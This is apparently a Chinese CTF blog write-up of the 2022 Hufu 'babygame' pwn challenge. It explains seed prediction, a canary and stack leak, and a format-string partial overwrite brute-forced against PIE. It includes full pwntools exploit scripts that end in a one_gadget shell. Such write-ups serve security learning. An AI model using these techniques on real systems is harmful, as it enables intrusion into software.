---
title: 虎符CTF2022_babygame
tags:
 - 爆破
 - PWN
 - 猜数游戏
categories:
 - hufuCTF
---
总结：
通过这道题的学习与收获有：

1、第一次尝试用爆破的方式来对抗PIE保护

2、重新温习了下猜数游戏这种类型的题目（思路就是想办法覆盖种子，自己跑个脚本）

3、做题没思路的时候，就先写个半成品脚本，动态调试一下，总能得到一些有用的信息。

4、格式化字符串这道题考察了一个payload里面，同时写和同时读。
<!--more-->

## 保护策略：


![image-20220411121543040](/upload/img/image-20220411121543040.png)


## 题目分析：
![image-20220411121546569](/upload/img/image-20220411121546569.png)



发现了溢出点（不过程序开了canary)，并且有个srand函数，猜测应该题目是个猜数游戏，同时我们还可以控制seed。

<img src="/upload/img/image-20220411121553302.png" alt="image-20220411121553302" style="zoom:50%;" />



猜数的逻辑是随机生成一个数字（可能为0,1,2），如果是0，你就要输入1；如果是1，你就要输入2；如果是2，你就要输入0。否则的话就返回0，如果满足条件就继续循环，直至100次，如果全部满足条件就返回1。

![image-20220411121600144](/upload/img/image-20220411121600144.png)



如果返回的是1，就可以进入这个sub_13F7函数，发现这个函数虽然没有溢出，但是存在一个格式化字符串漏洞。

## 做题思路

首先考虑一个点，程序给了溢出点，如果不用就太可惜了。用的话就要先泄露canary。可以发现read后面紧接着有一个%s将buf所打印出来，很明显这里可以把canary给带出来。

格式化字符串漏洞的威力很大，想利用的话，就要控制种子写个脚本跑一下即可进入存在格式化字符串漏洞的函数。

为了不将%s打印的内容截断，我们考虑把read输入的内容全写成\x11，直到把canary的00给覆盖了（防止00截断%s）。

![image-20220411121605256](/upload/img/image-20220411121605256.png)


发现canary存放的是var_18。

![image-20220411121609207](/upload/img/image-20220411121609207.png)




read输入的buf在这里![image-20220411121614047](/upload/img/image-20220411121614047.png)

因此offset=0x120-0x18+1=0x109（加1的目的是为了把canary的00给覆盖了）



然后考虑下格式化字符串怎么用？如果只根据现在获取的信息的话，我也不知道怎么用，不过可以先把脚本写出来，调试一下，看看栈里面有没有可用的信息。

半成品脚本：

```python
#coding:utf-8
from pwn import *
from ctypes import *
context(arch='amd64',os='linux',log_level='debug')
p=process('./a')
#gdb.attach(p, 'b * $rebase(0x1435)\nc')
e=ELF('./a')
lib=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
libc.srand(0x1111111111111111)
payload=0x109*'\x11'
p.send(payload)
p.recvuntil('\x11'*0x109)
canary=u64(p.recv(7).rjust(8,'\x00'))
print(hex(canary))
for i in range(100):
    v2=libc.rand()%3
    if v2==0:
        v3=1
    if v2==1:
        v3=2
    if v2==2:
        v3=0
    p.recvuntil(': \n')
    p.send(str(v3))
p.interactive()
```



可以看到现在已经进入到了存在格式化字符串漏洞的函数。


![image-20220411121619129](/upload/img/image-20220411121619129.png)

![image-20220411121622331](/upload/img/image-20220411121622331.png)


有两个非常值得注意的点，也是这道题的突破口，就是栈里存了一个atoi偏移16的真实地址。我们有个格式化字符串漏洞，可以打印栈中数据（不过有个条件），倘若拿到了atoi的真实地址，我们就获得了libc基地址，然后就可以去搜一下one_gadget了。别忘了，格式化字符串是可以任意地址任意写的（尝试将返回地址写成one_gadget地址）。

## 问题与对策

那现在有几个问题要考虑一下。

第一，格式化字符串打印栈中数据的前提是需要泄露栈地址，才可以打印指定的栈内容，怎么泄露栈地址？

第二，拿到libc基地址，再发送one_gadget，就势必需要劫持函数的控制流，可是我们第二次的read是没办法溢出的。

第三，怎么对抗PIE保护？



### 解释问题一：


![image-20220411121626663](/upload/img/image-20220411121626663.png)


我们再次观察栈中的数据发现，canary被%s打印完之后，打印并不会停止（因为没有遇见00），因此下面的栈中数据也被泄露出来了，碰巧这个数据是个栈地址。因此我们只需要接收完canary之后，再接收6字节，就可以泄露栈地址了。



### 解释问题二：

由于我们第一个read虽然可以溢出，但是我们只能去填充垃圾数据把canary和leak_stack_addr给带出来，因此没办法控制返回地址，第二个read没法溢出。那我们依旧**考虑格式化字符漏洞，尝试用它去修改返回地址（我们完全可以这样做，因为我们已经拿到了泄露的栈地址）**，修改返回地址为哪个地址？毋庸置疑，还得是第一个read的地址，因为我们要将one_gadget地址放到返回地址。当我试图将one_gadgeet地址写入返回地址时，突然意识到开启了PIE保护。



### 解释问题三：

先看下PIE保护所造成的问题吧。


![image-20220411121630124](/upload/img/image-20220411121630124.png)



**我现在试图将lea rax,[rbp-0x120]这个指令地址写入返回地址**，可是发现由于PIE保护的原因，每次程序运行的时候，这个地址只有后三位不变，前面的内容都会改变。这种情况就很是尴尬，**因为格式化字符串写的时候要么一次写一字节（两位），要么一次写两字节（四位）**（这里就不考虑一次写四字节的情况了）

因此我们根本没办法去正好控制后三位，那我们只控制后两位，让第三位去继承原本返回地址的内容？

返回地址

![image-20220411121634088](/upload/img/image-20220411121634088.png)



要修改成的地址
![image-20220411121637907](/upload/img/image-20220411121637907.png)



可以发现，这俩并不凑巧相同。那控制后四位（即两字节）？

**控制后四位的话，我们确实可以定死后三位，但是倒数第四位由于PIE的原因，它是随机的**，这条路行不通？

经过我尝试了许多别的方法，无论如何也都走不通，最后我又拐回来想这条路，突然意识到一件事，只有仅仅是倒数第四位随机而已，**如果爆破呢？我们就随便蒙一个倒数第四位，正确的概率是1/16**(已经不低了)(意思就是说每次PIE，使基址倒数第四位是随机的（后三位地址是固定的），我们可以蒙一个数，然后去运行程序，只要有一次运行的程序基址倒数第四位是我们蒙的数字，就说明我们此时爆破成功），此时就可以顺利返回到one_gadget的地址了。

## exp

```python
#coding:utf-8
from pwn import *
from ctypes import *
e=ELF('./a')
lib=ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")
def pwn():
    context(arch='amd64',os='linux',log_level='debug')
    #p=process('./a')
    #gdb.attach(p, 'b * $rebase(0x1435)\nc')

    libc.srand(0x1111111111111111)
    payload=0x109*'\x11'
    p.send(payload)
    p.recvuntil('\x11'*0x109)
    canary=u64(p.recv(7).rjust(8,'\x00'))
    leak_addr=u64(p.recv(6).ljust(8,'\x00'))
    print(hex(canary))
    print(hex(leak_addr))
    for i in range(100):
        v2=libc.rand()%3
        if v2==0:
            v3=1
        if v2==1:
            v3=2
        if v2==2:
            v3=0
        p.recvuntil(': \n')
        p.send(str(v3))
        
        
    print('leak_addr')
    payload='%42178c%9$hn'+'aaaa'+'%27$p'+'aaa'+p64(leak_addr-520)
    #42178就是十六进制的a4c2,我赌倒数第四位是a   ->.->
    p.send(payload)
    sleep(0.2)
    p.recvuntil('\x78')
    atoi_addr=int(p.recv(12),16)-16
    libc_base=atoi_addr-lib.sym['atoi']
    print('libc_base')
    print(hex(libc_base))
    sys_addr=lib.symbols['system']+libc_base
    bin_sh_addr=lib.search('/bin/sh').next()+libc_base
    payload2=0x108*'a'+p64(canary)+'b'*0x18+p64(0x4f302 +libc_base)
    p.send(payload2)
    sleep(0.2)
    p.send('0')
    p.interactive()
times=0
while 1:
    try:
        p = process("./a")
        pwn()
        p.interactive()
        exit(1)
    except:
        times += 1
        print("*"*10+str(times)+" times"+"*"*10)
        p.close()
```



![image-20220411121643381](/upload/img/image-20220411121643381.png)
PS：这道题如果打远程的话，是需要用题目中给出的动态库，如果本地的话，用自己本地的动态库就行
